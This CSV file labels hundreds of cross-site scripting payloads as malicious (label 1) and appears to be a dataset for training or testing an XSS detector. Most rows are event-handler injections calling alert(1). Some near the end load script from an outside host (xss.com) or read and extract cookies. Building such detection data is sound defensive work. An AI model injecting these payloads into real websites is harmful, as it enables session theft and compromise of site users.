input,label
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",1
<track id=x tabindex=1 onactivate=alert(1)></track>,1
<track id=x tabindex=1 onbeforeactivate=alert(1)></track>,1
<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>,1
<track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>,1
<track id=x tabindex=1 onfocus=alert(1)></track>,1
<track id=x tabindex=1 onfocusin=alert(1)></track>,1
"<track onbeforecopy=""alert(1)"" contenteditable>test</track>",1
"<track onbeforecut=""alert(1)"" contenteditable>test</track>",1
"<track onbeforepaste=""alert(1)"" contenteditable>test</track>",1
<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>,1
"<track onclick=""alert(1)"">test</track>",1
"<track oncontextmenu=""alert(1)"">test</track>",1
"<track oncopy=""alert(1)"" contenteditable>test</track>",1
"<track oncut=""alert(1)"" contenteditable>test</track>",1
"<track ondblclick=""alert(1)"">test</track>",1
<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>,1
"<track onkeydown=""alert(1)"" contenteditable>test</track>",1
"<track onkeypress=""alert(1)"" contenteditable>test</track>",1
"<track onkeyup=""alert(1)"" contenteditable>test</track>",1
"<track onmousedown=""alert(1)"">test</track>",1
"<track onmouseenter=""alert(1)"">test</track>",1
"<track onmouseleave=""alert(1)"">test</track>",1
"<track onmousemove=""alert(1)"">test</track>",1
"<track onmouseout=""alert(1)"">test</track>",1
"<track onmouseover=""alert(1)"">test</track>",1
"<track onmouseup=""alert(1)"">test</track>",1
"<track onpaste=""alert(1)"" contenteditable>test</track>",1
"<tt draggable=""true"" ondrag=""alert(1)"">test</tt>",1
"<tt draggable=""true"" ondragend=""alert(1)"">test</tt>",1
"<tt draggable=""true"" ondragenter=""alert(1)"">test</tt>",1
"<tt draggable=""true"" ondragleave=""alert(1)"">test</tt>",1
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1
<tt id=x tabindex=1 onactivate=alert(1)></tt>,1
<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>,1
<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>,1
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,1
<tt id=x tabindex=1 onfocus=alert(1)></tt>,1
<tt id=x tabindex=1 onfocusin=alert(1)></tt>,1
"<tt onbeforecopy=""alert(1)"" contenteditable>test</tt>",1
"<tt onbeforecut=""alert(1)"" contenteditable>test</tt>",1
"<tt onbeforepaste=""alert(1)"" contenteditable>test</tt>",1
<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>,1
"<tt onclick=""alert(1)"">test</tt>",1
"<tt oncontextmenu=""alert(1)"">test</tt>",1
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",1
"<tt oncut=""alert(1)"" contenteditable>test</tt>",1
"<tt ondblclick=""alert(1)"">test</tt>",1
<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,1
"<tt onkeydown=""alert(1)"" contenteditable>test</tt>",1
"<tt onkeypress=""alert(1)"" contenteditable>test</tt>",1
"<tt onkeyup=""alert(1)"" contenteditable>test</tt>",1
"<tt onmousedown=""alert(1)"">test</tt>",1
"<tt onmouseenter=""alert(1)"">test</tt>",1
"<tt onmouseleave=""alert(1)"">test</tt>",1
"<tt onmousemove=""alert(1)"">test</tt>",1
"<tt onmouseout=""alert(1)"">test</tt>",1
"<tt onmouseover=""alert(1)"">test</tt>",1
"<tt onmouseup=""alert(1)"">test</tt>",1
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",1
"<u draggable=""true"" ondrag=""alert(1)"">test</u>",1
"<u draggable=""true"" ondragend=""alert(1)"">test</u>",1
"<u draggable=""true"" ondragenter=""alert(1)"">test</u>",1
"<u draggable=""true"" ondragleave=""alert(1)"">test</u>",1
"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",1
<u id=x tabindex=1 onactivate=alert(1)></u>,1
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,1
<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>,1
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,1
<u id=x tabindex=1 onfocus=alert(1)></u>,1
<u id=x tabindex=1 onfocusin=alert(1)></u>,1
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",1
"<u onbeforecut=""alert(1)"" contenteditable>test</u>",1
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",1
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,1
"<u onclick=""alert(1)"">test</u>",1
"<u oncontextmenu=""alert(1)"">test</u>",1
"<u oncopy=""alert(1)"" contenteditable>test</u>",1
"<u oncut=""alert(1)"" contenteditable>test</u>",1
"<u ondblclick=""alert(1)"">test</u>",1
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,1
"<u onkeydown=""alert(1)"" contenteditable>test</u>",1
"<u onkeypress=""alert(1)"" contenteditable>test</u>",1
"<u onkeyup=""alert(1)"" contenteditable>test</u>",1
"<u onmousedown=""alert(1)"">test</u>",1
"<u onmouseenter=""alert(1)"">test</u>",1
"<u onmouseleave=""alert(1)"">test</u>",1
"<u onmousemove=""alert(1)"">test</u>",1
"<u onmouseout=""alert(1)"">test</u>",1
"<u onmouseover=""alert(1)"">test</u>",1
"<u onmouseup=""alert(1)"">test</u>",1
"<u onpaste=""alert(1)"" contenteditable>test</u>",1
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragend=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",1
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",1
<ul id=x tabindex=1 onactivate=alert(1)></ul>,1
<ul id=x tabindex=1 onbeforeactivate=alert(1)></ul>,1
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,1
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,1
<ul id=x tabindex=1 onfocus=alert(1)></ul>,1
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,1
"<ul onbeforecopy=""alert(1)"" contenteditable>test</ul>",1
"<ul onbeforecut=""alert(1)"" contenteditable>test</ul>",1
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",1
<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>,1
"<ul onclick=""alert(1)"">test</ul>",1
"<ul oncontextmenu=""alert(1)"">test</ul>",1
"<ul oncopy=""alert(1)"" contenteditable>test</ul>",1
"<ul oncut=""alert(1)"" contenteditable>test</ul>",1
"<ul ondblclick=""alert(1)"">test</ul>",1
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,1
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",1
"<ul onkeypress=""alert(1)"" contenteditable>test</ul>",1
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1
"<ul onmousedown=""alert(1)"">test</ul>",1
"<ul onmouseenter=""alert(1)"">test</ul>",1
"<ul onmouseleave=""alert(1)"">test</ul>",1
"<ul onmousemove=""alert(1)"">test</ul>",1
"<ul onmouseout=""alert(1)"">test</ul>",1
"<ul onmouseover=""alert(1)"">test</ul>",1
"<ul onmouseup=""alert(1)"">test</ul>",1
"<ul onpaste=""alert(1)"" contenteditable>test</ul>",1
"<var draggable=""true"" ondrag=""alert(1)"">test</var>",1
"<var draggable=""true"" ondragend=""alert(1)"">test</var>",1
"<var draggable=""true"" ondragenter=""alert(1)"">test</var>",1
"<var draggable=""true"" ondragleave=""alert(1)"">test</var>",1
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",1
<var id=x tabindex=1 onactivate=alert(1)></var>,1
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>,1
<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>,1
<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>,1
<var id=x tabindex=1 onfocus=alert(1)></var>,1
<var id=x tabindex=1 onfocusin=alert(1)></var>,1
"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",1
"<var onbeforecut=""alert(1)"" contenteditable>test</var>",1
"<var onbeforepaste=""alert(1)"" contenteditable>test</var>",1
<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>,1
"<var onclick=""alert(1)"">test</var>",1
"<var oncontextmenu=""alert(1)"">test</var>",1
"<var oncopy=""alert(1)"" contenteditable>test</var>",1
"<var oncut=""alert(1)"" contenteditable>test</var>",1
"<var ondblclick=""alert(1)"">test</var>",1
<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,1
"<var onkeydown=""alert(1)"" contenteditable>test</var>",1
"<var onkeypress=""alert(1)"" contenteditable>test</var>",1
"<var onkeyup=""alert(1)"" contenteditable>test</var>",1
"<var onmousedown=""alert(1)"">test</var>",1
"<var onmouseenter=""alert(1)"">test</var>",1
"<var onmouseleave=""alert(1)"">test</var>",1
"<var onmousemove=""alert(1)"">test</var>",1
"<var onmouseout=""alert(1)"">test</var>",1
"<var onmouseover=""alert(1)"">test</var>",1
"<var onmouseup=""alert(1)"">test</var>",1
"<var onpaste=""alert(1)"" contenteditable>test</var>",1
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay onplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video autoplay onplaying=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video draggable=""true"" ondrag=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragend=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",1
"<video draggable=""true"" ondragstart=""alert(1)"">test</video>",1
"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
"<video id=x controls onfocusin=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",1
<video id=x tabindex=1 onactivate=alert(1)></video>,1
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,1
<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>,1
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>,1
"<video onbeforecopy=""alert(1)"" contenteditable>test</video>",1
"<video onbeforecut=""alert(1)"" contenteditable>test</video>",1
"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",1
<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>,1
"<video oncanplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video onclick=""alert(1)"">test</video>",1
"<video oncontextmenu=""alert(1)"">test</video>",1
"<video oncopy=""alert(1)"" contenteditable>test</video>",1
"<video oncut=""alert(1)"" contenteditable>test</video>",1
"<video ondblclick=""alert(1)"">test</video>",1
<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>,1
"<video onkeydown=""alert(1)"" contenteditable>test</video>",1
"<video onkeypress=""alert(1)"" contenteditable>test</video>",1
"<video onkeyup=""alert(1)"" contenteditable>test</video>",1
"<video onloadeddata=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<video onmousedown=""alert(1)"">test</video>",1
"<video onmouseenter=""alert(1)"">test</video>",1
"<video onmouseleave=""alert(1)"">test</video>",1
"<video onmousemove=""alert(1)"">test</video>",1
"<video onmouseout=""alert(1)"">test</video>",1
"<video onmouseover=""alert(1)"">test</video>",1
"<video onmouseup=""alert(1)"">test</video>",1
"<video onpaste=""alert(1)"" contenteditable>test</video>",1
<video src/onerror=alert(1)>,1
<video><source onerror=alert(1) src=1></video>,1
"<video><track default onload=alert(1) src=""data:text/vtt,WEBVTT""></video>",1
"<wbr draggable=""true"" ondrag=""alert(1)"">test</wbr>",1
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",1
"<wbr draggable=""true"" ondragenter=""alert(1)"">test</wbr>",1
"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",1
"<wbr draggable=""true"" ondragstart=""alert(1)"">test</wbr>",1
<wbr id=x tabindex=1 onactivate=alert(1)></wbr>,1
<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,1
<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>,1
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,1
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,1
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,1
"<wbr onbeforecopy=""alert(1)"" contenteditable>test</wbr>",1
"<wbr onbeforecut=""alert(1)"" contenteditable>test</wbr>",1
"<wbr onbeforepaste=""alert(1)"" contenteditable>test</wbr>",1
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,1
"<wbr onclick=""alert(1)"">test</wbr>",1
"<wbr oncontextmenu=""alert(1)"">test</wbr>",1
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",1
"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",1
"<wbr ondblclick=""alert(1)"">test</wbr>",1
<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>,1
"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",1
"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>",1
"<wbr onkeyup=""alert(1)"" contenteditable>test</wbr>",1
"<wbr onmousedown=""alert(1)"">test</wbr>",1
"<wbr onmouseenter=""alert(1)"">test</wbr>",1
"<wbr onmouseleave=""alert(1)"">test</wbr>",1
"<wbr onmousemove=""alert(1)"">test</wbr>",1
"<wbr onmouseout=""alert(1)"">test</wbr>",1
"<wbr onmouseover=""alert(1)"">test</wbr>",1
"<wbr onmouseup=""alert(1)"">test</wbr>",1
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",1
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragend=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragleave=""alert(1)"">test</xmp>",1
"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",1
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,1
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,1
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,1
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,1
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>,1
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,1
"<xmp onbeforecopy=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onbeforecut=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",1
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,1
"<xmp onclick=""alert(1)"">test</xmp>",1
"<xmp oncontextmenu=""alert(1)"">test</xmp>",1
"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>",1
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",1
"<xmp ondblclick=""alert(1)"">test</xmp>",1
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>,1
"<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onkeypress=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onkeyup=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onmousedown=""alert(1)"">test</xmp>",1
"<xmp onmouseenter=""alert(1)"">test</xmp>",1
"<xmp onmouseleave=""alert(1)"">test</xmp>",1
"<xmp onmousemove=""alert(1)"">test</xmp>",1
"<xmp onmouseout=""alert(1)"">test</xmp>",1
"<xmp onmouseover=""alert(1)"">test</xmp>",1
"<xmp onmouseup=""alert(1)"">test</xmp>",1
"<xmp onpaste=""alert(1)"" contenteditable>test</xmp>",1
<xss id=x tabindex=1 onactivate=alert(1)></xss>,1
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,1
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>,1
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,1
<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>,1
<xss id=x tabindex=1 onfocus=alert(1)></xss>,1
<xss id=x tabindex=1 onfocusin=alert(1)></xss>,1
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,1
"'""--></style></script><script>shadowlabs(0x000045)</script>",1
<<scr\0ipt/src=http://xss.com/xss.js></script,1
"'""--></style></script><script>RWAR(0x00010E)</script>",1
' onmouseover=alert(/XSS/),1
"""><iframe src=""http://google.com""% 3E",1
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,1
xâ€‌</title><img src=x onerror=alert(1)>,1
"<script> document.getElementById(""safe123"").setCapture(); document.getElementById(""safe123"").click(); </script>",1
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",1
"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",1
"<script>(function() {var event = document.createEvent(""MouseEvents"");event.initMouseEvent(""click"", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>",1
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,1
"<script>xhr=new ActiveXObject(""Msxml2.XMLHTTP"");xhr.open(""GET"",""/xssme2"",true);xhr.onreadystatechange=function(){if(xhr.readyState==4&&xhr.status==200){alert(xhr.responseText.match(/'([^']+)/)[1])}};xhr.send();</script>",1
<script>alert(document.documentElement.innerHTML.match(/'([^']+)/)[1])</script>,1
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']+)/)[1])</script>,1
